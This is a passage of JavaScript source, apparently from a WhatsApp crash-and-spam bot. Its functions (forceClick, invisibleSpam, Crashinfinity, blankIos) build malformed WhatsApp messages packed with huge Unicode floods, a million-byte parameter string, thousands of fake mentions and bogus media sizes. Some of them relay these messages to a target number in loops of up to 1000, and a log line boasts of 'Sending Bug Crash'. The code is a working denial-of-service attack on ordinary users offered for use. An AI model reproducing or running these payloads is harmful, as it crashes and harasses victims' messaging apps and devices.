    console.log(`Succes Sending Bug Crash By XProtexGlow To ${target}`);
      }

async function forceClick(sock, target) {
  const buttonsList = [
    { type: "single_select", params: "" }
  ];

  for (let i = 0; i < 10; i++) {
    buttonsList.push(
      { type: "call_button", params: JSON.stringify({ status: true }) },
      { type: "copy_button", params: JSON.stringify({ display_text: "ꦽ".repeat(5000) }) },
      { type: "quick_reply", params: JSON.stringify({ display_text: "ꦽ".repeat(5000) }) }
    );
  }

  const messageData = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          contextInfo: {
            participant: target,
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from({ length: 1900 }, () => `${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`)
            ]
          },
          remoteJid: target,
          participant: `${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`,
          stanzaId: "123",
          quotedMessage: {
            paymentInviteMessage: {
              serviceType: 3,
              expiryTimestamp: Date.now() + 1814400000
            },
            forwardedAiBotMessageInfo: {
              botName: "META AI",
              botJid: `${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`,
              creatorName: "Bot"
            }
          }
        },
        carouselMessage: {
          messageVersion: 1,
          cards: [
            {
              header: {
                hasMediaAttachment: true,
                imageMessage: {
                  url: "https://mmg.whatsapp.net/v/t62.7118-24/533457741_1915833982583555_6414385787261769778_n.enc",
                  mimetype: "image/jpeg",
                  fileSha256: "QpvbDu5HkmeGRODHFeLP7VPj+PyKas/YTiPNrMvNPh4=",
                  fileLength: "9999999999999",
                  height: 9999,
                  width: 9999,
                  mediaKey: "exRiyojirmqMk21e+xH1SLlfZzETnzKUH6GwxAAYu/8=",
                  fileEncSha256: "D0LtargetIMWZ0qD/NmWxPMl9tphAlzdpVG/A3JxMHvEsySk=",
                  directPath: "/v/t62.7118-24/533457741_1915833982583555_6414385787261769778_n.enc"
                }
              },
              body: { text: "\n" + "\u0000".repeat(5000) },
              nativeFlowMessage: {
                buttons: buttonsList,
                messageParamsJson: "{".repeat(10000)
              }
            }
          ]
        }
      }
    }
  };

  await sock.relayMessage(target, messageData, { messageId: null, participant: { jid: target }, userJid: target });
  await sock.relayMessage(target, messageData, { messageId: null, participant: { jid: target }, userJid: target });
}

async function invisibleSpam(sock, target) {
    const type = ["galaxy_message", "call_permission_request", "address_message", "payment_method", "mpm"];
    
    for (const x of type) {
        const enty = Math.floor(Math.random() * type.length);
        const msg = generateWAMessageFromContent(
            target,
            {
                viewOnceMessage: {
                    message: {
                        interactiveResponseMessage: {
                            body: {
                                text: "\u0003",
                                format: "DEFAULT"
                            },
                            nativeFlowResponseMessage: {
                                name: x,
                                paramsJson: "\x10".repeat(1000000),
                                version: 3
                            },
                            entryPointConversionSource: type[enty]
                        }
                    }
                }
            },
            {
                participant: { jid: target }
            }
        );
        
        await sock.relayMessage(
            target,
            {
                groupStatusMessageV2: {
                    message: msg.message
                }
            },
            {
                messageId: msg.key.id,
                participant: { jid: target }
            }
        );
        
        await new Promise(resolve => setTimeout(resolve, 1000));
    }
}

async function Crashinfinity(sock, target) {
  const Rio4you = {
    requestPaymentMessage: {
      amount: {
        value: 2, 
        offset: 1, 
      currencyCodeIso4217: 'IDR',
      requestFrom: target, 
      caption: "ြ".repeat(15000),
      showAdAttribution: false,
      expiryTimestamp: Date.now() + 1000, 
      },
      contextInfo: {
       forwardingScore: 9999,
       isForwarded: true,
       remoteJid: "status@broadcast",
        externalAdReply: {
          title: "t.me/FIVETYWIN", 
          body: "ြ".repeat(10000),
          mimetype: "audio/mpeg",
          caption: "ြ".repeat(10000),
          sourceUrl: 't.me/FIVETYWIN',
          thumbnailUrl: { url: "https://files.catbox.moe/abcnix.jpg" }
        }
      }
    }
  };
  for (let i = 0; i < 1000; i++) {
  await sock.relayMessage(target, Rio4you, {
    participant: { jid: target },
    messageId: null,
    userJid: target,
    quoted: null
  });
 }
}

async function blankIos(sock, target) {
  await sock.sendMessage(
    target,
    {
      text: "👁‍🗨⃟꙰。⃝𝐀𝐩𝐨𝐥𝐥𝐨 ‌ ‌⃰ ⌁ 𝐅𝐯𝐜𝐤𝐞𝐫.ꪸ⃟‼️ ✩",
      contentText: "👁‍🗨⃟꙰。⃝𝐀𝐩𝐨𝐥𝐥𝐨 ‌ ‌⃰ ⌁ 𝐅𝐯𝐜𝐤𝐞𝐫.ꪸ⃟‼️ ✩",
      footer: "# - apollo ~ last",
      viewOnce: true,
      buttons: [
        {
          buttonId: "🦠",
          buttonText: {
            displayText: "🦠"
          },
          type: 4,
          nativeFlowInfo: {
            name: "single_select",
            paramsJson: JSON.stringify({
              title: `{"᬴".repeat(60000)}`,
              sections: [
                {
                  title: "",
                  highlight_label: "label",
                  rows: []
                }
              ]
            })
          }
        }
      ],
      headerType: 1
    },
    {
      ephemeralExpiration: 5,
      timeStamp: Date.now()
    }
  );
}

// ==== ( END FUNCTION ) ==== \\
/// --- ( Code Eror Kalo Script Kalian Eror ) --- \\\
function r(err) {
  const errorText = `❌ *Error Detected!*\n\`\`\`js\n${err.stack || err}\n\`\`\``;
  bot.sendMessage(OWNER_ID, errorText, {
    parse_mode: "Markdown"
  }).catch(e => console.log("Failed to send error to owner:", e));
};

process.on("uncaughtException", (err) => {
  console.error("Uncaught Exception:", err);
  r(err);
});

process.on("unhandledRejection", (reason, promise) => {
  console.error("Unhandled Rejection:", reason);
  r(reason);
});
